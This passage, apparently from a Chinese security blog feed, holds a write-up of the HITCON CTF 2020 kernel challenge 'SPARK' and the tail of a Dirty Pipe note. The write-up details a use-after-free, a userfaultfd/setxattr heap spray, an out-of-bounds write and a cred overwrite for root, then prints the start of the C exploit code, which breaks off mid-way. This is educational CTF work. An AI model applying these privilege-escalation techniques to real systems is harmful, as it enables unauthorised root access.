kiocb 实际上分别描述了一次IO的两端，iov_iter描述<strong>内存侧</strong>，kiocb描述<strong>文件侧</strong>，文件系统提供两个接口基于这两个数据结构封装读写操作。如<code>call_read_iter</code>调用<code>file-&gt;f_op-&gt;read_iter</code>, 将kiocb描述的文件数据，读到iov_iter描述的内存中。</p><ul><li><a href="https://blog.csdn.net/qq_32740107/article/details/106867342">CSDN一个讲解文件系统系列</a> </li></ul></li><li><p>另外几种<a href="https://raxis.com/blog/exploiting-dirty-pipe-cve-2022-0847">利用</a>: setuid, cron job, Authorized Keys. 其中Authorized Keys的原理是ssh的<a href="https://blog.csdn.net/weixin_53049621/article/details/122428597">公钥登录模式</a>. </p></li></ul><img src="../../image/dirtypipe/3bb603972d464513a47bfa8be4cc2a9d.png" alt="img" style="zoom: 40%;" /><p>其余详见<a href="../../files/dirty_pipe.pdf">ppt附件</a> </p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>源码分析</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>近期题目wp</title>
    <link href="/2022-09/Now-recent-ctf/"/>
    <url>/2022-09/Now-recent-ctf/</url>
    
    <content type="html"><![CDATA[<h2 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h2><blockquote><p>HITCON CTF 2020</p></blockquote><ul><li>代码里面看到<code>_InterlockedExchangeAdd()</code>函数, 其实是IDA中对lock指令前缀的函数替换. </li></ul><blockquote><p>汇编为<code>lock xadd cs:cur_count, eax</code> </p><p>The LOCK prefix can be prepended only to the following instructions and only to those forms of the instructions<br>where the destination operand is a memory operand: ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B,<br>CMPXCHG16B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, <strong>XADD</strong>, and XCHG.</p><p>xadd是Exchange and Add. </p></blockquote><ul><li>还有mutex的结构体…. 大小为32个字节. 包含了啥我就不看了.<br>没想到还是要注意一下, 后面用到了mutex中的owner成员, 当锁被使用时可以读取当前进程的current结构体地址, 从而发现cred结构体地址. </li><li><code>__fentry__</code>到底是个<a href="https://www.brendangregg.com/blog/2019-10-15/kernelrecipes-kernel-ftrace-internals.html">啥</a> | <a href="https://www.eet-china.com/mp/a41923.html">中文文章</a> </li><li><code>char (*names)[3]</code> pointer to an array of 3 chars. </li></ul><p>好吧看不懂, linux/spark.h又是什么东西. </p><p>艰难的继续看代码, spark.h应该是没给的… </p><ul><li>**fget()**函数的功能是通过文件描述符查找并返回file结构体<br>而node结构体应该在struct file中offset为200的位置. 但是我不知道file中哪个成员能存储这种信息. </li></ul><h3 id="来自mhackeroni队的wp启发"><a href="#来自mhackeroni队的wp启发" class="headerlink" title="来自mhackeroni队的wp启发:"></a>来自<a href="https://mhackeroni.it/archive/2020/12/05/hitcon2020-all-writeups.html#spark">mhackeroni</a>队的wp启发:</h3><p>ioctl功能:</p><ul><li>Link (<code>0x4008d900</code>): takes two node descriptors A and B, and a edge weight, and creates the edges A-&gt;B and B-&gt;A;</li><li>Info (<code>0x8018d901</code>): provides information about the node;</li><li>Finalize (<code>0xd902</code>): finalizes the graph rooted in the node, preparing it for queries;</li><li>Query (<code>0xc010d903</code>): takes two node descriptors and calculates the total weight of the shortest path between them.</li></ul><p>在release中: 如果refcount==1(正常情况), 释放traversal中nodes(如果有), 释放edge链表节点, 释放node. </p><p>其中的一些细节: </p><ul><li>open时每个节点的refcount默认为1, 当finalize的时候只有root节点进入<code>traversal()</code>函数时(第一次进入)不增加refcount, 这就意味着除了root, 其他的节点的refcount都会变成2. 而当release root的时候只有root.refcount小于2, 于是只有root的edge+traversal+node本身都被<code>kfree()</code>. <strong>看似正常, 实际上?</strong> </li><li>Info中有一个node-&gt;traversal-&gt;size的访问链, 而size在traversal中offset为0的位置. 意味着如果能够控制traversal字段那就可以实现任意读. <strong>如何控制traversal?</strong> </li><li>finalize中调用函数traversal进行DFS, 对node的refcount进行+1, 然而在link和query中没有refcount的判断和使用, 而且在release中如果大于等于二则直接退出, 不会调用kfree回收空间. <strong>能否修改refcount?</strong> </li><li>link后相邻节点保存在edge中, 然而当另一端的节点free/release后, edge中的node就构成了一个dangling ptr. 可以用来UAF. <strong>如何控制freed chunk?(uffd+setxattr)</strong> </li><li>query中malloc了一个dis_arr, 使用node及其children的traversal_idx来索引. <strong>能否越界?(看到个数组都要想能不能越界…)</strong> </li><li>具体为uffd+setxattr控制free后的chunk, 再伪造一个(finalize==1 &amp;&amp; traversal_idx&gt;16)的node, 制造出一个OOB(还真能越界). <strong>这个OOB能够修改什么东西?</strong> </li></ul><p>一般的内核题目都是提权, 直接变成root用户就可以读取/flag文件, 方法大致有任意写原语或者commit+prepare_cred. </p><p>可能的思路整理:</p><ul><li>还原ko文件类型信息. 看看demo.c中的示例便于理解. </li><li>还原成功, 发现可能是kmalloc和kfree为主的内核堆利用. 先制造出一个任意读. </li><li>getinfo中发现可能的任意读(只要控制了traversal), 这样只要在fd存在的时候node结构体同时也被我们控制就可以做到; 发现mutex的使用, 其中的owner成员可以直通cred; 发现UAF; 发现refcount的问题. </li><li>发现traversal_idx是属于node的属性, 而不是某次traversal的. 当query的时候还用到了node的children, 也就是默认了所有的child都属于同一次traversal. </li><li>综上所述, 结合<a href="https://duasynt.com/blog/linux-kernel-heap-spray">uffd+setxattr</a>的方法, 可以在link完一个网再release一个fd之后, 立刻使用这种方法来修改node的内容. 这算是一个基础步骤. 如何继续利用?</li><li>把node-&gt;traversal_idx修改超过dis_arr的边界, 在query的时候越界修改tmp_node的refcount, 这样在release root之后只有tmp_node+root的会被释放, 而tmp_node的fd反而不会被影响. 只要在这之后马上malloc就可以<strong>实现任意读</strong>了. <ul><li>还有个小问题是如何让dis_arr放到node的前面? exp给出了方法: 前后malloc一些node, 中间两百个node中每隔几个释放一个node, 而dis_arr的大小由traversal时遍历到的node数量决定, 设置链接的node数量为16或17(为什么呢?想想吧)时就会刚好占据了原先node的间隙, 满足了越界的位置需求. </li><li>然后<strong>读啥呢</strong>? </li></ul></li><li>可以读取<code>node.lock.owner</code>进而定位到<code>cred</code>, 而因为get_info的v3-&gt;size时候<code>mutex_lock(a1-&gt;state_lock);</code>已经锁上, 所以可以直接读取. </li><li>下一个问题在于node结构体在哪里? 所以要在读取owner之前扫描内存寻找我们设置的特殊值, 有了个任意读的能力确实也可以做到. <strong>扫哪里呢</strong>?</li><li>主要问题就在于现在一个内核地址都没有, <u>特别是用来kmalloc的那一块区域</u>. 但是! dmesg是可用的, 可以利用OOB制造一个crash, 然后读取寄存器信息进而获取相应地址. 这可以通过libc库实现, 具体见源码中的<strong>第一阶段</strong>.<br>另外发现这个crash会导致内核出错+进程暂停, 但是如果在一个fork出的child中直接让他exit就没有问题了. </li><li>到现在一二阶段和三阶段初始都已完成. 接下来的任务是如何<strong>制造任意写将cred中uid改成0(root)?</strong> </li><li>想到OOB, 理论上可以覆盖一个地址为与首个子节点的连接权值, 但要覆盖cred.uid的话还要知道dis_arr的地址. 又想到一阶段malloc了一个dis_arr且由于crash并没有释放, 如果此时通过release(fd)释放traversal再马上query, 既知道了地址(一阶段时)又得到了一个可用的dis_arr. </li><li>接下来就是构造一下所需的结构. 需要额外的一个root加上一些其他节点, 加上fd构成一张网, 把和fd的连接权值赋为0(并且is_finalized!=1)作为要写入的内容. 至于释放和造网两者的顺序想来是没有区别的. <ul><li>又一个细节是所用到的root和其他节点都是在第一阶段之前分配的. 或许是为了防止混乱. </li></ul></li><li>最后就是修改traversal_idx, 进行一个root的query, 然后就完成了cred.uid的覆盖. 最后的最后直接print /flag. </li></ul><p>这是36小时能做完的题目吗??</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/klog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span> <span class="hljs-comment">//used to set uffd interface</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEV_PATH <span class="hljs-meta-string">&quot;/dev/node&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_FINALIZE 0xd902</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_LINK 0x4008d900</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_QUERY 0xc010d903</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_INFO 0x8018D901</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> fd1;<br>    <span class="hljs-keyword">int</span> fd2;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> distance;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> num_children;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_idx;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_size;<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> g_create_next_id;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">create</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(DEV_PATH, O_RDONLY);<br>    assert(fd != <span class="hljs-number">-1</span>);<br>    g_create_next_id++;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">llink</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> weight)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_LINK, b | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)weight &lt;&lt; <span class="hljs-number">32</span>)) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span> <span class="hljs-title">qry</span> =</span> &#123;<br>        .fd1 = a,<br>        .fd2 = b,<br>    &#125;;<br>    assert(ioctl(a, SPARK_QUERY, &amp;qry) == <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> qry.distance;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">finalize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_FINALIZE) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">get_info</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, struct spark_info *info)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_INFO, info) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">release</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(close(a) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">sem_t</span> fault_sem;<br>    <span class="hljs-keyword">sem_t</span> unblock_sem;<br>    <span class="hljs-keyword">void</span> *addr;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">fault_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span> *<span class="hljs-title">param</span> =</span> (struct fault_arg *)arg;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *page = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    assert(page != MAP_FAILED);<br>    page[<span class="hljs-number">0</span>] = <span class="hljs-number">0xff</span>; <span class="hljs-comment">// top byte for traversal addr</span><br><br>    <span class="hljs-comment">// create a userfaultfd object</span><br>    <span class="hljs-keyword">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    assert(uffd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-comment">// enable the userfaultfd object</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    assert(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// n_addr is the start of where you want to catch the pagefault. In our</span><br>    <span class="hljs-comment">// case, we set it to the address of page 2</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)param-&gt;addr;<br>    uffdio_register.range.len = <span class="hljs-number">0x1000</span>;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    assert(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">0</span>);<br><br>    assert(sem_post(&amp;param-&gt;fault_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-keyword">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    assert(nready != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    assert(read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg)) == <span class="hljs-keyword">sizeof</span>(msg));<br>    assert(msg.event == UFFD_EVENT_PAGEFAULT);<br><br>    assert(sem_post(&amp;param-&gt;fault_sem) == <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// wait until reclaim_free is called. but in stage1 it doesn&#x27;t exist.</span><br>    assert(sem_wait(&amp;param-&gt;unblock_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)page;<br>    uffdio_copy.dst = (<span 